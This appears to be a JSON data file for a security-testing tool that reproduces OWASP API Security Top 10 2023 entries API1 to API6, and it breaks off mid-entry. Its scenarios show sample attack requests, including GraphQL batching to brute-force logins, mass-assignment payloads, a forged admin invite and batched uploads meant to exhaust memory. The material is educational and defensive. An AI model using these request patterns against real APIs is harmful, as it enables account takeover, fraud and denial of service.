[
    {
        "tags":
        [
            "CWE-285: Improper Authorization",
            "CWE-639: Authorization Bypass Through User-Controlled Key",
            "API1:2023 Broken Object Level Authorization"
        ],
        "testcase": "Broken Object Level Authorization",
        "details": "<table style=\"width:888.844px;\"><tbody><tr><td><p><strong>Threat agents/Attack vectors</strong></p></td><td><p><strong>Security Weakness</strong></p></td><td><p><strong>Impacts</strong></p></td></tr><tr><td><p>API Specific : Exploitability <strong>Easy</strong></p></td><td><p>Prevalence <strong>Widespread</strong> : Detectability <strong>Easy</strong></p></td><td><p>Technical <strong>Moderate</strong> : Business Specific</p></td></tr><tr><td><p>Attackers can exploit API endpoints that are vulnerable to broken object-level authorization by manipulating the ID of an object that is sent within the request. Object IDs can be anything from sequential integers, UUIDs, or generic strings. Regardless of the data type, they are easy to identify in the request target (path or query string parameters), request headers, or even as part of the request payload.</p></td><td><p>This issue is extremely common in API-based applications because the server component usually does not fully track the client’s state, and instead, relies more on parameters like object IDs, that are sent from the client to decide which objects to access. The server response is usually enough to understand whether the request was successful.</p></td><td><p>Unauthorized access to other users’ objects can result in data disclosure to unauthorized parties, data loss, or data manipulation. Under certain circumstances, unauthorized access to objects can also lead to full account takeover.</p></td></tr></tbody></table><h2></h2><h2>Is the API Vulnerable?</h2><p>Object level authorization is an access control mechanism that is usually implemented at the code level to validate that a user can only access the objects that they should have permissions to access.</p><p>Every API endpoint that receives an ID of an object, and performs any action on the object, should implement object-level authorization checks. The checks should validate that the logged-in user has permissions to perform the requested action on the requested object.</p><p>Failures in this mechanism typically lead to unauthorized information disclosure, modification, or destruction of all data.</p><p>Comparing the user ID of the current session (e.g. by extracting it from the JWT token) with the vulnerable ID parameter isn't a sufficient solution to solve Broken Object Level Authorization (BOLA). This approach could address only a small subset of cases.</p><p>In the case of BOLA, it's by design that the user will have access to the vulnerable API endpoint/function. The violation happens at the object level, by manipulating the ID. If an attacker manages to access an API endpoint/function they should not have access to - this is a case of <a href=\"https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/\" rel=\"noopener noreferrer\" target=\"_blank\">Broken Function Level Authorization</a> (BFLA) rather than BOLA.</p><h2></h2><h2>Example Attack Scenarios</h2><h3>Scenario #1</h3><p>An e-commerce platform for online stores (shops) provides a listing page with the revenue charts for their hosted shops. Inspecting the browser requests, an attacker can identify the API endpoints used as a data source for those charts and their pattern: /shops/{shopName}/revenue_data.json. Using another API endpoint, the attacker can get the list of all hosted shop names. With a simple script to manipulate the names in the list, replacing {shopName} in the URL, the attacker gains access to the sales data of thousands of e-commerce stores.</p><h3>Scenario #2</h3><p>An automobile manufacturer has enabled remote control of its vehicles via a mobile API for communication with the driver's mobile phone. The API enables the driver to remotely start and stop the engine and lock and unlock the doors. As part of this flow, the user sends the Vehicle Identification Number (VIN) to the API. The API fails to validate that the VIN represents a vehicle that belongs to the logged in user, which leads to a BOLA vulnerability. An attacker can access vehicles that don't belong to him.</p><h3>Scenario #3</h3><p>An online document storage service allows users to view, edit, store and delete their documents. When a user's document is deleted, a GraphQL mutation with the document ID is sent to the API.</p><pre>POST /graphql\n{\n  \"operationName\":\"deleteReports\",\n  \"variables\":{\n    \"reportKeys\":[\"&lt;DOCUMENT_ID&gt;\"]\n  },\n  \"query\":\"mutation deleteReports($siteId: ID!, $reportKeys: [String]!) {\n    {\n      deleteReports(reportKeys: $reportKeys)\n    }\n  }\"\n}\n</pre><p>Since the document with the given ID is deleted without any further permission checks, a user may be able to delete another user's document.</p><h2></h2><h2>How To Prevent</h2><ul><li>Implement a proper authorization mechanism that relies on the user policies and hierarchy.</li><li>Use the authorization mechanism to check if the logged-in user has access to perform the requested action on the record in every function that uses an input from the client to access a record in the database.</li><li>Prefer the use of random and unpredictable values as GUIDs for records' IDs.</li><li>Write tests to evaluate the vulnerability of the authorization mechanism. Do not deploy changes that make the tests fail.</li></ul><h2></h2><h2>References</h2><h3>OWASP</h3><ul><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">Authorization Cheat Sheet</a></li><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Testing_Automation_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">Authorization Testing Automation Cheat Sheet</a></li></ul><h3>External</h3><ul><li><a href=\"https://cwe.mitre.org/data/definitions/285.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-285: Improper Authorization</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/639.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-639: Authorization Bypass Through User-Controlled Key</a></li></ul>",
        "code": "API1:2023",
        "sort_order": 1
    },
    {
        "tags":
        [
            "CWE-204: Observable Response Discrepancy",
            "CWE-307: Improper Restriction of Excessive Authentication Attempts",
            "API2:2023 Broken Authentication"
        ],
        "testcase": "Broken Authentication",
        "details": "<table style=\"width:888.844px;\"><tbody><tr><td><p><strong>Threat agents/Attack vectors</strong></p></td><td><p><strong>Security Weakness</strong></p></td><td><p><strong>Impacts</strong></p></td></tr><tr><td><p>API Specific : Exploitability <strong>Easy</strong></p></td><td><p>Prevalence <strong>Common</strong> : Detectability <strong>Easy</strong></p></td><td><p>Technical <strong>Severe</strong> : Business Specific</p></td></tr><tr><td><p>The authentication mechanism is an easy target for attackers since it's exposed to everyone. Although more advanced technical skills may be required to exploit some authentication issues, exploitation tools are generally available.</p></td><td><p>Software and security engineers’ misconceptions regarding authentication boundaries and inherent implementation complexity make authentication issues prevalent. Methodologies of detecting broken authentication are available and easy to create.</p></td><td><p>Attackers can gain complete control of other users’ accounts in the system, read their personal data, and perform sensitive actions on their behalf. Systems are unlikely to be able to distinguish attackers’ actions from legitimate user ones.</p></td></tr></tbody></table><h2></h2><h2>Is the API Vulnerable?</h2><p>Authentication endpoints and flows are assets that need to be protected. Additionally, \"Forgot password / reset password\" should be treated the same way as authentication mechanisms.</p><p>An API is vulnerable if it:</p><ul><li>Permits credential stuffing where the attacker uses brute force with a list of valid usernames and passwords.</li><li>Permits attackers to perform a brute force attack on the same user account, without presenting captcha/account lockout mechanism.</li><li>Permits weak passwords.</li><li>Sends sensitive authentication details, such as auth tokens and passwords in the URL.</li><li>Allows users to change their email address, current password, or do any other sensitive operations without asking for password confirmation.</li><li>Doesn't validate the authenticity of tokens.</li><li>Accepts unsigned/weakly signed JWT tokens ({\"alg\":\"none\"})</li><li>Doesn't validate the JWT expiration date.</li><li>Uses plain text, non-encrypted, or weakly hashed passwords.</li><li>Uses weak encryption keys.</li></ul><p>On top of that, a microservice is vulnerable if:</p><ul><li>Other microservices can access it without authentication</li><li>Uses weak or predictable tokens to enforce authentication</li></ul><h2></h2><h2>Example Attack Scenarios</h2><h2></h2><h2>Scenario #1</h2><p>In order to perform user authentication the client has to issue an API request like the one below with the user credentials:</p><pre>POST /graphql\n{\n  \"query\":\"mutation {\n    login (username:\\\"&lt;username&gt;\\\",password:\\\"&lt;password&gt;\\\") {\n      token\n    }\n   }\"\n}\n</pre><p>If credentials are valid, then an auth token is returned which should be provided in subsequent requests to identify the user. Login attempts are subject to restrictive rate limiting: only three requests are allowed per minute.</p><p>To brute force log in with a victim's account, bad actors leverage GraphQL query batching to bypass the request rate limiting, speeding up the attack:</p><pre>POST /graphql\n[\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"password\\\"){token}}\"},\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"123456\\\"){token}}\"},\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"qwerty\\\"){token}}\"},\n  ...\n  {\"query\":\"mutation{login(username:\\\"victim\\\",password:\\\"123\\\"){token}}\"},\n]\n</pre><h2></h2><h2>Scenario #2</h2><p>In order to update the email address associated with a user's account, clients should issue an API request like the one below:</p><pre>PUT /account\nAuthorization: Bearer &lt;token&gt;\n\n{ \"email\": \"&lt;new_email_address&gt;\" }\n</pre><p>Because the API does not require users to confirm their identity by providing their current password, bad actors able to put themselves in a position to steal the auth token might be able to take over the victim's account by starting the reset password workflow after updating the email address of the victim's account.</p><h2></h2><h2>How To Prevent</h2><ul><li>Make sure you know all the possible flows to authenticate to the API (mobile/ web/deep links that implement one-click authentication/etc.). Ask your engineers what flows you missed.</li><li>Read about your authentication mechanisms. Make sure you understand what and how they are used. OAuth is not authentication, and neither are API keys.</li><li>Don't reinvent the wheel in authentication, token generation, or password storage. Use the standards.</li><li>Credential recovery/forgot password endpoints should be treated as login endpoints in terms of brute force, rate limiting, and lockout protections.</li><li>Require re-authentication for sensitive operations (e.g. changing the account owner email address/2FA phone number).</li><li>Use the <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">OWASP Authentication Cheatsheet</a>.</li><li>Where possible, implement multi-factor authentication.</li><li>Implement anti-brute force mechanisms to mitigate credential stuffing, dictionary attacks, and brute force attacks on your authentication endpoints. This mechanism should be stricter than the regular rate limiting mechanisms on your APIs.</li><li>Implement <a href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism(OTG-AUTHN-003)\" rel=\"noopener noreferrer\" target=\"_blank\">account lockout</a>/captcha mechanisms to prevent brute force attacks against specific users. Implement weak-password checks.</li><li>API keys should not be used for user authentication. They should only be used for <a href=\"https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\" rel=\"noopener noreferrer\" target=\"_blank\">API clients</a> authentication.</li></ul><h2></h2><h2>References</h2><h3>OWASP</h3><ul><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">Authentication Cheat Sheet</a></li><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">Key Management Cheat Sheet</a></li><li><a href=\"https://owasp.org/www-community/attacks/Credential_stuffing\" rel=\"noopener noreferrer\" target=\"_blank\">Credential Stuffing</a></li></ul><h3>External</h3><ul><li><a href=\"https://cwe.mitre.org/data/definitions/204.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-204: Observable Response Discrepancy</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/307.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-307: Improper Restriction of Excessive Authentication Attempts</a></li></ul>",
        "code": "API2:2023",
        "sort_order": 2
    },
    {
        "tags":
        [
            "CWE-213: Exposure of Sensitive Information Due to Incompatible Policies",
            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
            "API3:2023 Broken Object Property Level Authorization"
        ],
        "testcase": "Broken Object Property Level Authorization",
        "details": "<table style=\"width:888.844px;\"><tbody><tr><td><p><strong>Threat agents/Attack vectors</strong></p></td><td><p><strong>Security Weakness</strong></p></td><td><p><strong>Impacts</strong></p></td></tr><tr><td><p>API Specific : Exploitability <strong>Easy</strong></p></td><td><p>Prevalence <strong>Common</strong> : Detectability <strong>Easy</strong></p></td><td><p>Technical <strong>Moderate</strong> : Business Specific</p></td></tr><tr><td><p>APIs tend to expose endpoints that return all object’s properties. This is particularly valid for REST APIs. For other protocols such as GraphQL, it may require crafted requests to specify which properties should be returned. Identifying these additional properties that can be manipulated requires more effort, but there are a few automated tools available to assist in this task.</p></td><td><p>Inspecting API responses is enough to identify sensitive information in returned objects’ representations. Fuzzing is usually used to identify additional (hidden) properties. Whether they can be changed is a matter of crafting an API request and analyzing the response. Side-effect analysis may be required if the target property is not returned in the API response.</p></td><td><p>Unauthorized access to private/sensitive object properties may result in data disclosure, data loss, or data corruption. Under certain circumstances, unauthorized access to object properties can lead to privilege escalation or partial/full account takeover.</p></td></tr></tbody></table><h2></h2><h2>Is the API Vulnerable?</h2><p>When allowing a user to access an object using an API endpoint, it is important to validate that the user has access to the specific object properties they are trying to access.</p><p>An API endpoint is vulnerable if:</p><ul><li>The API endpoint exposes properties of an object that are considered sensitive and should not be read by the user. (previously named: \"<a href=\"https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/\" rel=\"noopener noreferrer\" target=\"_blank\">Excessive Data Exposure</a>\")</li><li>The API endpoint allows a user to change, add/or delete the value of a sensitive object's property which the user should not be able to access (previously named: \"<a href=\"https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/\" rel=\"noopener noreferrer\" target=\"_blank\">Mass Assignment</a>\")</li></ul><h2></h2><h2>Example Attack Scenarios</h2><h3>Scenario #1</h3><p>A dating app allows a user to report other users for inappropriate behavior. As part of this flow, the user clicks on a \"report\" button, and the following API call is triggered:</p><pre>POST /graphql\n{\n  \"operationName\":\"reportUser\",\n  \"variables\":{\n    \"userId\": 313,\n    \"reason\":[\"offensive behavior\"]\n  },\n  \"query\":\"mutation reportUser($userId: ID!, $reason: String!) {\n    reportUser(userId: $userId, reason: $reason) {\n      status\n      message\n      reportedUser {\n        id\n        fullName\n        recentLocation\n      }\n    }\n  }\"\n}\n</pre><p>The API Endpoint is vulnerable since it allows the authenticated user to have access to sensitive (reported) user object properties, such as \"fullName\" and \"recentLocation\" that are not supposed to be accessed by other users.</p><h3>Scenario #2</h3><p>An online marketplace platform, that offers one type of users (\"hosts\") to rent out their apartment to another type of users (\"guests\"), requires the host to accept a booking made by a guest, before charging the guest for the stay.</p><p>As part of this flow, an API call is sent by the host to POST /api/host/approve_booking with the following legitimate payload:</p><pre>{\n  \"approved\": true,\n  \"comment\": \"Check-in is after 3pm\"\n}\n</pre><p>The host replays the legitimate request, and adds the following malicious payload:</p><pre>{\n  \"approved\": true,\n  \"comment\": \"Check-in is after 3pm\",\n  \"total_stay_price\": \"$1,000,000\"\n}\n</pre><p>The API endpoint is vulnerable because there is no validation that the host should have access to the internal object property - total_stay_price, and the guest will be charged more than she was supposed to be.</p><h3>Scenario #3</h3><p>A social network that is based on short videos, enforces restrictive content filtering and censorship. Even if an uploaded video is blocked, the user can change the description of the video using the following API request:</p><pre>PUT /api/video/update_video\n\n{\n  \"description\": \"a funny video about cats\"\n}\n</pre><p>A frustrated user can replay the legitimate request, and add the following malicious payload:</p><pre>{\n  \"description\": \"a funny video about cats\",\n  \"blocked\": false\n}\n</pre><p>The API endpoint is vulnerable because there is no validation if the user should have access to the internal object property - blocked, and the user can change the value from true to false and unlock their own blocked content.</p><h2></h2><h2>How To Prevent</h2><ul><li>When exposing an object using an API endpoint, always make sure that the user should have access to the object's properties you expose.</li><li>Avoid using generic methods such as to_json() and to_string(). Instead, cherry-pick specific object properties you specifically want to return.</li><li>If possible, avoid using functions that automatically bind a client's input into code variables, internal objects, or object properties (\"Mass Assignment\").</li><li>Allow changes only to the object's properties that should be updated by the client.</li><li>Implement a schema-based response validation mechanism as an extra layer of security. As part of this mechanism, define and enforce data returned by all API methods.</li><li>Keep returned data structures to the bare minimum, according to the business/functional requirements for the endpoint.</li></ul><h2></h2><h2>References</h2><h3>OWASP</h3><ul><li><a href=\"https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/\" rel=\"noopener noreferrer\" target=\"_blank\">API3:2019 Excessive Data Exposure - OWASP API Security Top 10 2019</a></li><li><a href=\"https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/\" rel=\"noopener noreferrer\" target=\"_blank\">API6:2019 - Mass Assignment - OWASP API Security Top 10 2019</a></li><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">Mass Assignment Cheat Sheet</a></li></ul><h3>External</h3><ul><li><a href=\"https://cwe.mitre.org/data/definitions/213.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-213: Exposure of Sensitive Information Due to Incompatible Policies</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/915.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes</a></li></ul>",
        "code": "API3:2023",
        "sort_order": 3
    },
    {
        "tags":
        [
            "CWE-770: Allocation of Resources Without Limits or Throttling",
            "CWE-400: Uncontrolled Resource Consumption",
            "CWE-799: Improper Control of Interaction Frequency",
            "API4:2023 Unrestricted Resource Consumption"
        ],
        "testcase": "Unrestricted Resource Consumption",
        "details": "<table style=\"width:888.844px;\"><tbody><tr><td><p><strong>Threat agents/Attack vectors</strong></p></td><td><p><strong>Security Weakness</strong></p></td><td><p><strong>Impacts</strong></p></td></tr><tr><td><p>API Specific : Exploitability <strong>Average</strong></p></td><td><p>Prevalence <strong>Widespread</strong> : Detectability <strong>Easy</strong></p></td><td><p>Technical <strong>Severe</strong> : Business Specific</p></td></tr><tr><td><p>Exploitation requires simple API requests. Multiple concurrent requests can be performed from a single local computer or by using cloud computing resources. Most of the automated tools available are designed to cause DoS via high loads of traffic, impacting APIs’ service rate.</p></td><td><p>It's common to find APIs that do not limit client interactions or resource consumption. Crafted API requests, such as those including parameters that control the number of resources to be returned and performing response status/time/length analysis should allow identification of the issue. The same is valid for batched operations. Although threat agents don't have visibility over costs impact, this can be inferred based on service providers’ (e.g. cloud provider) business/pricing model.</p></td><td><p>Exploitation can lead to DoS due to resource starvation, but it can also lead to operational costs increase such as those related to the infrastructure due to higher CPU demand, increasing cloud storage needs, etc.</p></td></tr></tbody></table><h2></h2><h2>Is the API Vulnerable?</h2><p>Satisfying API requests requires resources such as network bandwidth, CPU, memory, and storage. Sometimes required resources are made available by service providers via API integrations, and paid for per request, such as sending emails/SMS/phone calls, biometrics validation, etc.</p><p>An API is vulnerable if at least one of the following limits is missing or set inappropriately (e.g. too low/high):</p><ul><li>Execution timeouts</li><li>Maximum allocable memory</li><li>Maximum number of file descriptors</li><li>Maximum number of processes</li><li>Maximum upload file size</li><li>Number of operations to perform in a single API client request (e.g. GraphQL batching)</li><li>Number of records per page to return in a single request-response</li><li>Third-party service providers' spending limit</li></ul><h2></h2><h2>Example Attack Scenarios</h2><h3>Scenario #1</h3><p>A social network implemented a “forgot password” flow using SMS verification, enabling the user to receive a one time token via SMS in order to reset their password.</p><p>Once a user clicks on \"forgot password\" an API call is sent from the user's browser to the back-end API:</p><pre>POST /initiate_forgot_password\n\n{\n  \"step\": 1,\n  \"user_number\": \"6501113434\"\n}\n</pre><p>Then, behind the scenes, an API call is sent from the back-end to a 3rd party API that takes care of the SMS delivering:</p><pre>POST /sms/send_reset_pass_code\n\nHost: willyo.net\n\n{\n  \"phone_number\": \"6501113434\"\n}\n</pre><p>The 3rd party provider, Willyo, charges $0.05 per this type of call.</p><p>An attacker writes a script that sends the first API call tens of thousands of times. The back-end follows and requests Willyo to send tens of thousands of text messages, leading the company to lose thousands of dollars in a matter of minutes.</p><h3>Scenario #2</h3><p>A GraphQL API Endpoint allows the user to upload a profile picture.</p><pre>POST /graphql\n\n{\n  \"query\": \"mutation {\n    uploadPic(name: \\\"pic1\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {\n      url\n    }\n  }\"\n}\n</pre><p>Once the upload is complete, the API generates multiple thumbnails with different sizes based on the uploaded picture. This graphical operation takes a lot of memory from the server.</p><p>The API implements a traditional rate limiting protection - a user can't access the GraphQL endpoint too many times in a short period of time. The API also checks for the uploaded picture's size before generating thumbnails to avoid processing pictures that are too large.</p><p>An attacker can easily bypass those mechanisms, by leveraging the flexible nature of GraphQL:</p><pre>POST /graphql\n\n[\n  {\"query\": \"mutation {uploadPic(name: \\\"pic1\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n  {\"query\": \"mutation {uploadPic(name: \\\"pic2\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n  ...\n  {\"query\": \"mutation {uploadPic(name: \\\"pic999\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n}\n</pre><p>Because the API does not limit the number of times the uploadPic operation can be attempted, the call will lead to exhaustion of server memory and Denial of Service.</p><h3>Scenario #3</h3><p>A service provider allows clients to download arbitrarily large files using its API. These files are stored in cloud object storage and they don't change that often. The service provider relies on a cache service to have a better service rate and to keep bandwidth consumption low. The cache service only caches files up to 15GB.</p><p>When one of the files gets updated, its size increases to 18GB. All service clients immediately start pulling the new version. Because there were no consumption cost alerts, nor a maximum cost allowance for the cloud service, the next monthly bill increases from US$13, on average, to US$8k.</p><h2></h2><h2>How To Prevent</h2><ul><li>Use a solution that makes it easy to limit <a href=\"https://docs.docker.com/config/containers/resource_constraints/#memory\" rel=\"noopener noreferrer\" target=\"_blank\">memory</a>, <a href=\"https://docs.docker.com/config/containers/resource_constraints/#cpu\" rel=\"noopener noreferrer\" target=\"_blank\">CPU</a>, <a href=\"https://docs.docker.com/engine/reference/commandline/run/#restart\" rel=\"noopener noreferrer\" target=\"_blank\">number of restarts</a>, <a href=\"https://docs.docker.com/engine/reference/commandline/run/#ulimit\" rel=\"noopener noreferrer\" target=\"_blank\">file descriptors, and processes</a> such as Containers / Serverless code (e.g. Lambdas).</li><li>Define and enforce a maximum size of data on all incoming parameters and payloads, such as maximum length for strings, maximum number of elements in arrays, and maximum upload file size (regardless of whether it is stored locally or in cloud storage).</li><li>Implement a limit on how often a client can interact with the API within a defined timeframe (rate limiting).</li><li>Rate limiting should be fine tuned based on the business needs. Some API Endpoints might require stricter policies.</li><li>Limit/throttle how many times or how often a single API client/user can execute a single operation (e.g. validate an OTP, or request password recovery without visiting the one-time URL).</li><li>Add proper server-side validation for query string and request body parameters, specifically the one that controls the number of records to be returned in the response.</li><li>Configure spending limits for all service providers/API integrations. When setting spending limits is not possible, billing alerts should be configured instead.</li></ul><h2></h2><h2>References</h2><h3>OWASP</h3><ul><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#availability\" rel=\"noopener noreferrer\" target=\"_blank\">\"Availability\" - Web Service Security Cheat Sheet</a></li><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#dos-prevention\" rel=\"noopener noreferrer\" target=\"_blank\">\"DoS Prevention\" - GraphQL Cheat Sheet</a></li><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#mitigating-batching-attacks\" rel=\"noopener noreferrer\" target=\"_blank\">\"Mitigating Batching Attacks\" - GraphQL Cheat Sheet</a></li></ul><h3>External</h3><ul><li><a href=\"https://cwe.mitre.org/data/definitions/770.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-770: Allocation of Resources Without Limits or Throttling</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/400.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-400: Uncontrolled Resource Consumption</a></li><li><a href=\"https://cwe.mitre.org/data/definitions/799.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-799: Improper Control of Interaction Frequency</a></li><li>\"Rate Limiting (Throttling)\" - <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">Security Strategies for Microservices-based Application Systems</a>, NIST</li></ul>",
        "code": "API4:2023",
        "sort_order": 4
    },
    {
        "tags":
        [
            "CWE-285: Improper Authorization",
            "API5:2023 Broken Function Level Authorization"
        ],
        "testcase": "Broken Function Level Authorization",
        "details": "<table style=\"width:888.844px;\"><tbody><tr><td><p><strong>Threat agents/Attack vectors</strong></p></td><td><p><strong>Security Weakness</strong></p></td><td><p><strong>Impacts</strong></p></td></tr><tr><td><p>API Specific : Exploitability <strong>Easy</strong></p></td><td><p>Prevalence <strong>Common</strong> : Detectability <strong>Easy</strong></p></td><td><p>Technical <strong>Severe</strong> : Business Specific</p></td></tr><tr><td><p>Exploitation requires the attacker to send legitimate API calls to an API endpoint that they should not have access to as anonymous users or regular, non-privileged users. Exposed endpoints will be easily exploited.</p></td><td><p>Authorization checks for a function or resource are usually managed via configuration or code level. Implementing proper checks can be a confusing task since modern applications can contain many types of roles, groups, and complex user hierarchies (e.g. sub-users, or users with more than one role). It's easier to discover these flaws in APIs since APIs are more structured, and accessing different functions is more predictable.</p></td><td><p>Such flaws allow attackers to access unauthorized functionality. Administrative functions are key targets for this type of attack and may lead to data disclosure, data loss, or data corruption. Ultimately, it may lead to service disruption.</p></td></tr></tbody></table><h2></h2><h2>Is the API Vulnerable?</h2><p>The best way to find broken function level authorization issues is to perform a deep analysis of the authorization mechanism while keeping in mind the user hierarchy, different roles or groups in the application, and asking the following questions:</p><ul><li>Can a regular user access administrative endpoints?</li><li>Can a user perform sensitive actions (e.g. creation, modification, or deletion ) that they should not have access to by simply changing the HTTP method (e.g. from GET to DELETE)?</li><li>Can a user from group X access a function that should be exposed only to users from group Y, by simply guessing the endpoint URL and parameters (e.g. /api/v1/users/export_all)?</li></ul><p>Don't assume that an API endpoint is regular or administrative only based on the URL path.</p><p>While developers might choose to expose most of the administrative endpoints under a specific relative path, like /api/admins, it's very common to find these administrative endpoints under other relative paths together with regular endpoints, like /api/users.</p><h2></h2><h2>Example Attack Scenarios</h2><h3>Scenario #1</h3><p>During the registration process for an application that allows only invited users to join, the mobile application triggers an API call to GET /api/invites/{invite_guid}. The response contains a JSON with details about the invite, including the user's role and the user's email.</p><p>An attacker duplicates the request and manipulates the HTTP method and endpoint to POST /api/invites/new. This endpoint should only be accessed by administrators using the admin console. The endpoint does not implement function level authorization checks.</p><p>The attacker exploits the issue and sends a new invite with admin privileges:</p><pre>POST /api/invites/new\n\n{\n  \"email\": \"attacker@somehost.com\",\n  \"role\":\"admin\"\n}\n</pre><p>Later on, the attacker uses the maliciously crafted invite in order to create themselves an admin account and gain full access to the system.</p><h3>Scenario #2</h3><p>An API contains an endpoint that should be exposed only to administrators - GET /api/admin/v1/users/all. This endpoint returns the details of all the users of the application and does not implement function level authorization checks. An attacker who learned the API structure takes an educated guess and manages to access this endpoint, which exposes sensitive details of the users of the application.</p><h2></h2><h2>How To Prevent</h2><p>Your application should have a consistent and easy-to-analyze authorization module that is invoked from all your business functions. Frequently, such protection is provided by one or more components external to the application code.</p><ul><li>The enforcement mechanism(s) should deny all access by default, requiring explicit grants to specific roles for access to every function.</li><li>Review your API endpoints against function level authorization flaws, while keeping in mind the business logic of the application and groups hierarchy.</li><li>Make sure that all of your administrative controllers inherit from an administrative abstract controller that implements authorization checks based on the user's group/role.</li><li>Make sure that administrative functions inside a regular controller implement authorization checks based on the user's group and role.</li></ul><h2></h2><h2>References</h2><h3>OWASP</h3><ul><li><a href=\"https://owasp.org/www-community/attacks/Forced_browsing\" rel=\"noopener noreferrer\" target=\"_blank\">Forced Browsing</a></li><li>\"A7: Missing Function Level Access Control\", <a href=\"https://github.com/OWASP/Top10/raw/master/2013/OWASP%20Top%2010%20-%202013.pdf\" rel=\"noopener noreferrer\" target=\"_blank\">OWASP Top 10 2013</a></li><li><a href=\"https://owasp.org/www-community/Access_Control\" rel=\"noopener noreferrer\" target=\"_blank\">Access Control</a></li></ul><h3>External</h3><ul><li><a href=\"https://cwe.mitre.org/data/definitions/285.html\" rel=\"noopener noreferrer\" target=\"_blank\">CWE-285: Improper Authorization</a></li></ul>",
        "code": "API5:2023",
        "sort_order": 5
    },
    {
        "tags":
        [
            "API6:2023 Unrestricted Access to Sensitive Business Flows"
        ],
        "testcase": "Unrestricted Access to Sensitive Business Flows",
        "details": "<table style=\"width:888.844px;\"><tbody><tr><td><p><strong>Threat agents/Attack vectors</strong></p></td><td><p><strong>Security Weakness</strong></p></td><td><p><strong>Impacts</strong></p></td></tr><tr><td><p>API Specific : Exploitability <strong>Easy</strong></p></td><td><p>Prevalence <strong>Widespread</strong> : Detectability <strong>Average</strong></p></td><td><p>Technical <strong>Moderate</strong> : Business Specific</p></td></tr><tr><td><p>Exploitation usually involves understanding the business model backed by the API, finding sensitive business flows, and automating access to these flows, causing harm to the business.</p></td><td><p>Lack of a holistic view of the API in order to fully support business requirements tends to contribute to the prevalence of this issue. Attackers manually identify what resources (e.g. endpoints) are involved in the target workflow and how they work together. If mitigation mechanisms are already in place, attackers need to find a way to bypass them.</p></td><td><p>In general technical impact is not expected. Exploitation might hurt the business in different ways, for example: prevent legitimate users from purchasing a product, or lead to inflation in the internal economy of a game.</p></td></tr></tbody></table><h2></h2><h2>Is the API Vulnerable?</h2><p>When creating an API Endpoint, it is important to understand which business flow it exposes. Some business flows are more sensitive than others, in the sense that excessive access to them may harm the business.</p><p>Common examples of sensitive business flows and risk of excessive access associated with them:</p><ul><li>Purchasing a product flow - an attacker can buy all the stock of a high-demand item at once and resell for a higher price (scalping)</li><li>Creating a comment/post flow - an attacker can spam the system</li><li>Making a reservation - an attacker can reserve all the available time slots and prevent other users from using the system</li></ul><p>The risk of excessive access might change between industries and businesses. For example - creation of posts by a script might be considered as a risk of spam by one social network, but encouraged by another social network.</p><p>An API Endpoint is vulnerable if it exposes a sensitive business flow, without appropriately restricting the access to it.</p><h2></h2><h2>Example Attack Scenarios</h2><h3>Scenario #1</h3><p>A technology company announces they are going to release a new gaming console on Thanksgiving. The product has a very high demand and the stock is limited. An attacker writes code to automatically buy the new product and complete the transaction.</p><p>On the release day, the attacker runs the code distributed across different IP addresses and locations. The API doesn't implement the appropriate protection and allows the attacker to buy the majority of the stock before other legitimate users.</p><p>Later on, the attacker sells the product on another platform for a much higher price.</p><h3>Scenario #2</h3><p>An airline company offers online ticket purchasing with no cancellation fee. A user with malicious intentions books 90% of the seats of a desired flight.</p><p>A few days before the flight the malicious user canceled all the tickets at once, which forced the airline to discount the ticket prices in order to fill the flight.</p><p>At this point, the user buys herself a single ticket that is much cheaper than the original one.</p><h3>Scenario #3</h3><p>A ride-sharing 